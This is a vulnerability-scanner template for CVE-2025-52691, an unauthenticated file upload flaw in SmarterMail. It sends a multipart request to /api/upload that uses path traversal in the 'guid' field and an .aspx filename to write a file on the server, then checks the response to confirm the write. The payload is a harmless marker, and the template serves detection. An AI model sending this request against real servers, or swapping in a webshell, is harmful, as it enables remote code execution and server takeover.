id: CVE-2025-52691

info:
  name: SmarterMail - Unrestricted File Upload
  author: zan8in
  severity: critical
  verified: true
  descripion: |-
    CVE-2025-52691是一个影响SmarterTools SmarterMail邮件服务器的软件安全漏洞，官方公开信息显示该漏洞允许无需认证的攻击者通过网络向邮件服务器上传任意文件，这种未受限制的文件上传可能被利用来植入恶意脚本或webshell，从而在目标系统上实现远程代码执行并完全控制服务器，漏洞被评为10.0 CVSS最高严重等级（Critical）并影响SmarterMail Build 9406及更早版本，SmarterTools已经发布补丁（如9413及以后版本）修复该问题并强烈建议用户尽快升级以防止潜在攻击。
    fofa: app="SmarterTools-SmarterMail"
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52691
    - https://mp.weixin.qq.com/s/zKxDRzdWGHHbSWlW1yVfNg
  tags: cve,cve2025,smartermail,fileupload
  created: 2026/10/19

set:
  rfilename: randomLowercase(10)
  rtruefilename: randomLowercase(10)
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /api/upload
      headers:
        Content-Type: multipart/form-data; boundary=----{{rboundary}}
      body: |
        ------{{rboundary}}
        Content-Disposition: form-data; name="context"

        attachment
        ------{{rboundary}}
        Content-Disposition: form-data; name="resumableIdentifier"

        fakeID
        ------{{rboundary}}
        Content-Disposition: form-data; name="resumableFilename"

        {{rfilename}}.aspx
        ------{{rboundary}}
        Content-Disposition: form-data; name="contextData"

        {"guid":"dag/../../{{rtruefilename}}"}
        ------{{rboundary}}
        Content-Disposition: form-data; name="whatever"; filename="{{rfilename}}.jpg"

        Detection Artifact Generator
        ------{{rboundary}}--
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"key":') &&
      response.body.bcontains(bytes('"fileName":"' + rfilename + '.aspx"')) &&
      response.body.bcontains(bytes(rtruefilename + '_0.aspx"'))
expression: r0()
